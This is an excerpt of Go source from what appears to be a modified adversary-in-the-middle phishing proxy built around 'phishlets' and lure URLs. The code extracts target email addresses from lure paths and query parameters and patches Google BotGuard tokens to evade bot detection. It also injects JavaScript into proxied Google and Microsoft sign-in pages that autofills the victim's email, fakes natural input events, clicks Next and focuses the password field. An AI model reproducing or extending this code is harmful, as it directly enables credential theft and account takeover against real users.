			...
			if phished {
						...
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								...
								if err == nil {
									...
									// extract email from lure path suffix (e.g. /lurepath/$email@domain.com)
									if l != nil && strings.HasPrefix(req_path, l.Path) {
										path_suffix := strings.TrimPrefix(req_path, l.Path)
										path_suffix = strings.TrimPrefix(path_suffix, "$")
										path_suffix = strings.TrimSuffix(path_suffix, "/")
										if path_suffix != "" && strings.Contains(path_suffix, "@") {
											session.Params["email"] = path_suffix
											log.Info("[%s] extracted email from lure path: %s", pl_name, path_suffix)
										}
									}
				...
				if pl != nil && ps.SessionId != "" {
					...
					if err == nil {
						...
						// Google BotGuard token bypass (requires -google-bypass flag + Chrome on :9222)
						if p.googleBypass && strings.Contains(strings.ToLower(req.Host), "google.com") &&
							strings.Contains(req.URL.Path, "batchexecute") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
							if patched, err := PatchGoogleBotGuardToken(body); err != nil {
								log.Debug("google_bypass: %v", err)
							} else {
								body = patched
							}
						}
				...
				if stringExists(mime, []string{"text/html"}) {
					...
					if pl != nil && ps.SessionId != "" {
						...
						if ok {
							...
							// Inject automatic email autofill JavaScript
							if email, hasEmail := s.Params["email"]; hasEmail && email != "" {
								emailAutofillJS := p.generateEmailAutofillJS(email, pl)
								if emailAutofillJS != "" {
									body = p.injectJavascriptIntoBody(body, emailAutofillJS, "")
									log.Debug("email_autofill: injected email autofill for session: %s, email: %s", s.Id, email)
								}
							}
						}
					}
...
// generateEmailAutofillJS generates JavaScript to automatically pre-fill email fields
func (p *HttpProxy) generateEmailAutofillJS(email string, pl *Phishlet) string {
	// Escape email for JavaScript
	emailEscaped := strings.ReplaceAll(email, "\\", "\\\\")
	emailEscaped = strings.ReplaceAll(emailEscaped, "'", "\\'")
	emailEscaped = strings.ReplaceAll(emailEscaped, "\"", "\\\"")
	
	// Generate JavaScript that works for multiple phishlet types
	js := fmt.Sprintf(`
(function() {
	var email = '%s';
	var filled = false;
	...
	function prefillEmail() {
		...
		// Common email field selectors for different services
		var selectors = [
			'input[name="loginfmt"]',
		...
		var nextSelectors = [
			...
			'#idSIButton9',
			'button[type="submit"]',
			'div[role="button"][id*="Next" i]',
			'button[id*="next" i]'
		];

		function clickNext() {
			for (var n = 0; n < nextSelectors.length; n++) {
				var btn = document.querySelector(nextSelectors[n]);
		...
		for (var i = 0; i < selectors.length; i++) {
			try {
				...
				if (field && !field.value && field.type !== 'password') {
					...
					// Trigger events to make it look natural
					var events = ['input', 'change', 'keyup', 'blur'];
					for (var j = 0; j < events.length; j++) {
						var evt = new Event(events[j], { bubbles: true, cancelable: true });
						field.dispatchEvent(evt);
					}
					
					// Also try setting value property directly
					try {
						Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(field, email);
					} catch(e) {}
					
					filled = true;

					// Auto-click Next on Google / Microsoft sign-in flows
					setTimeout(function() {
						clickNext();
					}, 400);
					setTimeout(function() {
					...
					setTimeout(function() {
						var pwdSelectors = [
							...
							'input[id*="password" i]',
							'input[id*="passwd" i]',
							'#i0118', // Microsoft O365 password
							'#password'
						];
						
						for (var k = 0; k < pwdSelectors.length; k++) {
							var pwdField = document.querySelector(pwdSelectors[k]);
							if (pwdField) {
								pwdField.focus();
								break;
							}
	...
	setTimeout(prefillEmail, 500);
	setTimeout(prefillEmail, 1000);
	setTimeout(prefillEmail, 2000);
...
func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
	...
	// First, extract simple email parameter (for autograb feature)
	emailParams := []string{"email", "e", "loginfmt", "username", "user", "mail"}
	for _, paramName := range emailParams {
		if emailVal, ok := vals[paramName]; ok && len(emailVal) > 0 && emailVal[0] != "" {
			session.Params["email"] = emailVal[0]
			session.Params[paramName] = emailVal[0]
			log.Debug("extracted email parameter '%s'='%s'", paramName, emailVal[0])
			ret = true
		}
	}

	// Also extract other simple parameters
	for k, v := range vals {
		if len(v) > 0 && v[0] != "" {
			// Skip encrypted parameters (handled below)
			if len(v[0]) <= 8 {
				// Simple parameter
				if _, exists := session.Params[k]; !exists {
				...
				if crc == crc_chk {
					...
					if err == nil {
						for kk, vv := range params {
							...
							// Also set email if found in encrypted params
							if (kk == "email" || kk == "e" || kk == "loginfmt") && session.Params["email"] == "" {
								session.Params["email"] = vv[0]
							}
						}
						ret = true
						break
